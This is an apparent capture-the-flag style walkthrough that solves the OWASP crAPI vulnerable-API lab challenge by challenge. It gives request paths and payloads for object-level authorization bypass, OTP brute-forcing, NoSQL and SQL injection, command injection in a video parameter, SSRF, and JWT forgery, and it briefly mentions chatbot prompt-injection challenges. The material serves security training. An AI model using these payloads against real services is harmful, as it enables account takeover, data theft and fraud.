# crAPI Complete Lab Writeup – All Challenge Solutions

This is a practical, step-by-step solution guide for the documented challenges in **OWASP crAPI** (Completely Ridiculous API). It is designed for video demonstration — clear actions, expected endpoints, and key observations.

**Assumptions**
- crAPI is running locally (`docker compose` from the official repo).
- Web UI: `http://localhost:8888`
- MailHog (emails): `http://localhost:8025`
- You have Burp Suite (or ZAP/Postman) intercepting traffic.
- Create at least two accounts (e.g., `user1@example.com` and `user2@example.com`) and add a vehicle to each using the VIN + PIN from MailHog.

**Note on official solutions file**: The repo’s `challengeSolutions.md` only fully documents Challenges 1, 2, 8, 9 and 15. The rest are intentionally left as exercises. The solutions below combine the official steps with widely verified community approaches.

---

## Challenge 1 – Access details of another user’s vehicle (BOLA)

1. Log in → Dashboard → **Add Vehicle** (use VIN + PIN from MailHog).
2. Click **Refresh Location**. Capture the request:
   ```
   GET /identity/api/v2/vehicle/<your-vehicle-uuid>/location
   ```
3. Go to **Community** (`/forum`). Capture:
   ```
   GET /community/api/v2/community/posts/recent
   ```
   The response contains other users’ `vehicleid` (UUID).
4. Replay the location request and replace your vehicle UUID with another user’s UUID.
5. Response returns latitude, longitude, and full name of the other user.

---

## Challenge 2 – Access mechanic reports of other users (BOLA)

1. Add a vehicle → **Contact Mechanic** → submit a service request.
2. Capture the response of:
   ```
   POST /workshop/api/merchant/contact_mechanic
   ```
   Look for `report_link` (contains `report_id`).
3. Request the report:
   ```
   GET /workshop/api/mechanic/mechanic_report?report_id=<id>
   ```
4. Change `report_id` to other values (try sequential IDs). You can view other users’ mechanic reports.

---

## Challenge 3 – Reset the password of a different user (Broken User Authentication)

1. From Community or mechanic reports, collect another user’s email (e.g., `adam007@example.com`).
2. Go to Forgot Password and request an OTP for the target email:
   ```
   POST /identity/api/auth/forget-password
   {"email":"target@example.com"}
   ```
3. Capture the OTP verification request (normally `/identity/api/auth/v3/check-otp`).
4. Change the path to the older version that has **no rate limiting**:
   ```
   POST /identity/api/auth/v2/check-otp
   {"email":"target@example.com","otp":"0000","password":"NewPass123!"}
   ```
5. Brute-force the 4-digit OTP (0000–9999) with Intruder/ffuf. When you hit the correct OTP you receive “OTP verified”.
6. Log in with the new password.

---

## Challenge 4 – Find an API endpoint that leaks sensitive information of other users (Excessive Data Exposure)

- Browse Community → `/community/api/v2/community/posts/recent`.
- The response leaks emails, vehicle IDs, names, etc. of other users.

(Alternative: vehicle listing endpoints sometimes leak previous owners.)

---

## Challenge 5 – Find an API endpoint that leaks an internal property of a video

1. Go to Profile → upload a video under “My Personal Video”.
2. Capture the response of the upload or the subsequent video listing:
   ```
   GET/POST /identity/api/v2/user/videos
   ```
3. Look for the internal property `conversion_params` (this value is useful for later challenges).

---

## Challenge 6 – Perform a Layer 7 DoS using ‘contact mechanic’ feature

1. Capture a normal Contact Mechanic request:
   ```
   POST /workshop/api/merchant/contact_mechanic
   ```
2. Modify the body:
   ```json
   {
     "repeat_request_if_failed": true,
     "number_of_repeats": 1000
   }
   ```
3. Send. You receive a message similar to:
   `Service unavailable. Seems like you caused layer 7 DoS :)`

---

## Challenge 7 – Delete a video of another user (BFLA)

1. Upload a video with one account and note the video ID (from rename request or profile).
2. Capture a “Change Video Name” request (normally `PUT /identity/api/v2/user/videos/<id>`).
3. Change method to `DELETE` and path to admin:
   ```
   DELETE /identity/api/v2/admin/videos/<other-user-video-id>
   ```
4. Send with a normal user’s JWT. The video is deleted.

---

## Challenge 8 – Get an item for free (Mass Assignment)

1. Go to Shop → buy the Seat ($10). Capture:
   ```
   POST /workshop/api/shop/orders
   ```
2. Replay and change `quantity` to a **negative** value (e.g., `-1`).
3. Balance increases and the order still appears. You effectively received credit for free.

(Alternative community method: return an order and force status to “returned” without actually returning it.)

---

## Challenge 9 – Increase your balance by $1,000 or more

Same as Challenge 8, but use a larger negative quantity (e.g., `quantity: -100` or lower). Balance jumps by $1,000+.

---

## Challenge 10 – Update internal video properties (Mass Assignment)

1. From Challenge 5 you already have the internal property `conversion_params`.
2. Capture a video rename/update request:
   ```
   PUT /identity/api/v2/user/videos/<id>
   ```
3. Add the field to the JSON body, e.g.:
   ```json
   "conversion_params": "-v codec h264 && whoami"
   ```
4. The property is accepted and stored (useful for further exploitation in some versions).

---

## Challenge 11 – SSRF (make crAPI call https://www.google.com)

1. Capture Contact Mechanic request again.
2. Change the `mechanic_api` value to:
   ```
   https://www.google.com
   ```
3. Send. The response contains the HTML of Google (or the target URL) under `response_from_mechanic_api`.

---

## Challenge 12 – Get free coupons without knowing the code (NoSQL Injection)

1. Shop → Add Coupon → Validate any code. Capture:
   ```
   POST /community/api/v2/coupon/validate-coupon
   ```
2. Replace `coupon_code` with a NoSQL operator:
   ```json
   {"coupon_code": {"$ne": null}}
   ```
   or `{"$ne": 1}`
3. You receive a valid coupon code (e.g., `TRAC075`). Apply it for free credit.

---

## Challenge 13 – Redeem an already-claimed coupon (SQL Injection)

1. After claiming a coupon, capture the apply request:
   ```
   POST /workshop/api/shop/apply_coupon
   ```
2. Inject into `coupon_code`, e.g.:
   ```
   TRAC075' OR '1'='1
   ```
   or more advanced payloads that force the claim check to pass / delete the previous claim record.
3. The coupon can be redeemed again (balance increases).

---

## Challenge 14 – Find an endpoint that does not perform authentication checks

Two common ones:

- Mechanic report endpoint from Challenge 2:
  ```
  GET /workshop/api/mechanic/mechanic_report?report_id=<id>
  ```
  Works **without** any Authorization header.

- Order details:
  ```
  GET /workshop/api/shop/orders/<order_id>
  ```
  (or the UI equivalent) also works unauthenticated in many deployments.

---

## Challenge 15 – Forge valid JWT Tokens

Official solutions cover four main techniques:

1. **Algorithm Confusion (RS256 → HS256)**  
   - Fetch public key from `http://localhost:8888/.well-known/jwks.json`  
   - Use the public key as the HMAC secret and sign a new JWT with `alg: HS256`.

2. **None / Invalid Signature**  
   - Some endpoints (especially dashboard) do not properly verify the signature. Change `sub` to another user’s email and remove/alter the signature.

3. **JKU Misuse**  
   - Create your own RSA key pair. Host the public key in JWK format. Set `jku` header to your hosted key URL and sign with your private key.

4. **KID Path Traversal**  
   - Set `kid` to `../../../../../../dev/null`  
   - Sign with HS256 using secret `AA==` (base64 of null byte).

Any one of these is enough to complete the challenge.

---

## Challenges 16–18 (LLM / Chatbot)

These are newer and depend on the exact version of crAPI you are running (some deployments include a GenAI chatbot):

- **16** – Prompt injection leading to client-side rendering / XSS-style output.
- **17** – Extract another user’s credentials via the chatbot (RAG leakage or shared chat history).
- **18** – Make the chatbot perform actions (e.g., place an order) on behalf of another user.

Exact payloads vary by version; treat them as exploratory once the core 1–15 are solid.

---

## Secret Challenges

The documentation explicitly states there are additional secret challenges that are intentionally undocumented and “pretty complex.” They are left for advanced exploration.

---

## Video Demo Tips

- Always show the request in Burp Repeater / Postman side-by-side with the browser.
- Highlight the changed parameter (red circle or zoom).
- Show the successful response and then verify the effect in the UI (balance change, deleted video, etc.).
- Keep a second account open so you can demonstrate cross-user impact immediately.

---

**File generated for video demonstration purposes.**  
*Based on official crAPI documentation + verified community solutions.*
